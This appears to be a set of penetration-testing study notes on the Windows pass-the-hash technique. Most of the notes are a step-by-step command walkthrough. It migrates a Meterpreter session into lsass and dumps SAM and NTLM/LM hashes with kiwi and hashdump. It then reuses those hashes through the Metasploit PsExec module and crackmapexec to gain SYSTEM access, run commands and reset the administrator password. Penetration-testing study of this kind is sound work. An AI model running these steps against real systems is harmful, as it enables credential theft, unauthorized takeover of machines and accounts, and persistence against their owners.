Pass-the-hash is an exploit technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to auth with the target legitimately.

We can use multiple tools to faciliate a Pass-The-Hash attack:
  Metasploit PsExec module
  Crackmapexec
  
This technique will allow us to obtain access to the target system via legit creds as opposed to obtaining access via service exploit, this sets us up for a form of persistence if that service exploit ends up being patched.

-----------------------------------Exploit-------------------------------------

**get access to the host by whatever means you end up finding, in this example it will be badblue exploit**

**now that you have a meterpreter session**
pgrep lsass
migrate 780 *whatever the lsass session is**
getuid
load kiwi
lsa_dump_sam
**now you have the administrator NTLM hash and other account hashes**
**to perform pass the hash attack with metasploit PsExec module you need the NTLM AND LM hash**
hashdump (this will give information in this format SID:LM:NTLM)
ctrl+z (this will background the meterpreter session)
search psexec (look for exploit/windows/smb/psexec)
**set port, host, and authentication credentials**
set SMBUser <username>
set SMBPass <LM:NTLM>
set target Command (if you dont get a meterpreter session, try different targets by using 'set target')
run
**another meterpreter session should now open**
getuid (NT AUTHORITY\SYSTEM)

-----------------------------------crackmapexec------------------------------
crackmapexec smb <ip> -u Administrator -H "<NTLM>"
**this should now give you access**
-x "ipconfig" (you can now execute commands)
-x "whoami"
-x "net user administrator password123"
-x "net user"
(these are just a few commands you can run as an example)
